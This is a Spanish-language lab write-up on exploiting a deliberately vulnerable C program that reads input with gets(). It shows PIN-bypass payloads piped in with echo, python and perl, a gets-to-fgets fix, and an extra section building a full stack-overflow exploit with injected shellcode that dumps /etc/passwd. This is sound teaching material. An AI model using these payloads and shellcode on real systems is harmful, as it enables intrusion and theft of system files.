# Vulnerabilidades Web y uso de mod-security


## 🅰️ Buffer Overflow
---

### 📦 Compilación y ejecución

Primero compilamos el siguiente código escrito en C:

```c
// desbordamiento.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
char* crear_pin_aleatorio() {
        char* pin = (char *) malloc(5);;  
        srand(time(0));  // Inicializa generador de nos. aleatorios
        sprintf(pin, "%04d", rand()%10000);
        return pin;
}

int main(int argc, char *argv[]) {
        char pin_secreto[5];
        strcpy(pin_secreto, crear_pin_aleatorio());

        char pin_leido[5];
        printf("Introducir PIN: ");
        gets(pin_leido);   // No comprueba tamano de entrada

        if (strcmp(pin_leido, pin_secreto) == 0){
           printf("Acceso concedido, pin correcto\n");
        }
        else {
           printf("Acceso denegado, pin incorrecto\n");
        }

        printf("PISTA:\n pin secreto: %s\n pin leido: %s\n", pin_secreto,pin_leido);
}
```

Para compilarlo, es importante desactivar las protecciones contra el `stack smashing`. Para hacerlo ejecutamos el siguiente comando:

```sh
# Con protección (por defecto usa -fstack-protector-all)
gcc -o desbordamiento-no-vulnerable desbordamiento.c
# Sin protección
gcc -fno-stack-protector -o desbordamiento-vulnerable desbordamiento.c
```

Si ejecutamos cualquiera de los dos programas generados,
el resultado será el siguiente:

```sh
Introducir PIN: ESEI
Acceso denegado, pin incorrecto
PISTA:
 pin secreto: 0614
 pin leido: ESEI
```

Si volvemos a ejecutarlo, vemos que el pin cambia dinámicamente y que nos acepta cualquier caracter mediante la entrada estándar del sistema.

Si probamos a ejecutar los comandos con una entrada mayor a la deseada, obtendremos los siguientes resultados:

```sh
# ./desbordamiento-no-vulnerable
Introducir PIN: SEGURIDAD
Acceso denegado, pin incorrecto
PISTA:
 pin secreto: 6581
 pin leido: SEGURIDAD
*** stack smashing detected ***: <unknown> terminated
Abortado (`core` generado)
# ./desbordamiento-vulnerable
Introducir PIN: SEGURIDAD
Acceso denegado, pin incorrecto
PISTA:
 pin secreto: IDAD
 pin leido: SEGURIDAD
# ./desbordamiento-vulnerable
Introducir PIN: DEMASIADA SEGURIDAD
Acceso denegado, pin incorrecto
PISTA:
 pin secreto: IADA SEGURIDAD
 pin leido: DEMASIADA SEGURIDAD
Violación de segmento (`core` generado)
```

En el `desbordamiento-no-vulnerable` vemos que salta una alerta y que el PIN generado se mantiene.

En el `desbordamiento-vulnerable` vemos dos posibles salidas:

- El PIN generado se sobreescribe sin causar la ruptura del programa.
- El PIN generado se sobreescribe pero causamos la ruptura del programa.

### 💭 ¿Por qué pasa esto?

A grandes rasgos, el **Stack** de la función principal del programa es el siguiente:

| **STACK** |
| --- |
| ... |
| pin leído |
| pin secreto |
| ... |
| return pointer |
| ... |

La función `gets` nos permite introducir en el `pin leído` el valor que deseemos. El problema es que no se preocupa de la cantidad de caracteres que insertamos.

Ambos PIN tienen un espacio reservado de 5 caracteres como máximo (4 para el PIN y uno para el fin de string).

Si introducimos una entrada mayor a 5 caracteres, los valores inferiores del **Stack** se sobreescriben.

De esta forma seremos capaces de designar el PIN secreto deseado o incluso de modificar la dirección de retorno.

### 💣 Explotación

Podemos explotar este programa de muchas maneras. La más sencilla será generar un texto con dos strings iguales para, de esta manera, sobreescribir ambos PIN.

Usaremos cualquier programa que nos permita mostrar caracteres sin representación ASCII:

```sh
echo -e "Esei\x00Esei" | ./desbordamiento-vulnerable

python -c "print('HACK\0HACK')" | ./desbordamiento-vulnerable

perl -e 'print "0000\x000000"' | ./desbordamiento-vulnerable
```

Cualquiera de estos comandos nos dará el siguiente resultado:

```sh
Introducir PIN: Acceso concedido, pin correcto
```

### 🔒 Corrección

La función `gets` habría de ser reemplazada por otra más segura. Por ejemplo:

```c
fgets(pin_leido, 4, stdin);
```

En este caso, el PIN introducido siempre será de 3 dígitos (dado que el cuarto pertenece al fin de cadena `\0`). De esta forma prevenimos este tipo de **Buffer Overflow**.

### 💎 ¡EXTRA! Más cosas divertidas

Aunque esto no entra dentro de la práctica, me he visto en la obligación de hacerlo. Podemos ejecutar comandos arbitrarios a partir del programa vulnerable. Para ello, vamos a recompilarlo de la siguiente manera:

```sh
gcc -fno-stack-protector -z execstack -o desbordamiento-vulnerable desbordamiento.c
```

Con el flag `-z execstack` nos aseguramos de que cualquier código en ensamblador que metamos dentro del **Stack** puede llegar a ejecutarse si el *Instruction Pointer* apunta directamente a dicha dirección.

El **exploit** lo vamos a realizar de la siguiente manera:

1. Como ya sabemos que el programa es vulnerable al desbordamiento de buffer, intentaremos sobreescribir la dirección de retorno para que apunte a donde nosotros queramos.
2. ¿A dónde nos interesa que apunte? Pues en este caso al **Stack**, dado que tenemos control sobre él, pudiendo sobreescribirlo a nuestro antojo.
3. Dentro del **Stack** incluiremos código ensamblador (a partir de ahora llamado `shellcode`).

Para ello, lo primero es encontrar mediante un *debugger* -en mi caso `gdb`- el tamaño exacto de la entrada que nos permita sobreescribir la posición de retorno:

```sh
echo 'AAAABBBBCCCCDDDDEEEE' > pattern
gdb -q desbordamiento-vulnerable
        r < pattern
                Starting program: desbordamiento-vulnerable < pattern
                Introducir PIN: Acceso denegado, pin incorrecto
                PISTA:
                pin secreto: BBBCCCCDDDDEEEE
                pin leido: AAAABBBBCCCCDDDDEEEE

                Program received signal SIGSEGV, Segmentation fault.

                0x00007ffff7004545 in ?? ()
```

Como podemos ver, la última línea es `0x00007ffff7004545 in ?? ()`. Si nos fijamos en los últimos números de la dirección, observamos que es `...4545` o, traducido a ASCII, `..EE`. Por lo tanto, a partir de la segunda `E` de nuesto *pattern* podemos sobreescribir la dirección de retorno:

```py
#!/usr/bin/env python2

# AAAABBBBCCCCDDDDEE<retorno>
# Hay 18 bytes antes del retorno

offset = 'A' * 18
ret = ''

print(offset + ret)
```

> A partir de ahora escribiré un script de Python para ir facilitando la tarea de generar el exploit

Volviendo al gdb hacemos el comando `info registers` para ver la posición del **Stack**:

| Stack Pointer | Arquitectura |
| --- | --- |
| rsp | x86_64 |
| esp | x86 |

> En mi caso trabajo con 64bit

```
rsp            0x7fffffffde10	0x7fffffffde10
```

Teniendo la dirección, actualizamos el exploit:

```py
#!/usr/bin/env python2

offset = 'A' * 18
# Debe ir en hexadecimal
ret = '\x7f\xff\xff\xff\xde\x10'
# Le tenemos que dar la vuelta por el modelo Little-Endian
ret = ret[::-1]

print(offset + ret)
```

Ahora sólo falta añadir nuestro `shellcode`. Para facilitarlo, he buscado uno para `Linux x86_64` en [shell-storm.org](https://shell-storm.org) que me permita leer el archivo `/etc/passwd`:

```py
shellcode = '\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41'
```

Sólamente queda juntar todo y, por hacerlo más bonito, modificaremos el offset de tal manera que además de ejecutar el comando, podamos saltarnos el PIN:

```py
#!/usr/bin/env python2

bypass = 'HACK\0HACK\0'
offset = 'A' * 18
ret = '\x7f\xff\xff\xff\xde\x10'[::-1]
shellcode = '\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41'

print(bypass + offset + ret + shellcode)
```

Ahora sólamente guardamos el *exploit* en un archivo y lo ejecutamos con `gdb` para ver qué ocurre:

```
python2 exploit.py > exploit
gdb -q desbordamiento-vulnerable
    r < exploit
        Starting program: desbordamiento-vulnerable < exploit
        Introducir PIN: Acceso concedido, pin correcto
        PISTA:
        pin secreto: HACK
        pin leido: HACK
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
                [...]
        hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
        geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
        gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
        gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
        ssi:x:1000:1000:SSI Buff Overflow,,,:/home/ssi:/bin/bash
        [Inferior 1 (process 56194) exited with code 01]
```

**¡Conseguido!** ¡Hemos sido capaces de ejecutar comandos arbritarios aprovechando la vulnerabilidad del programa!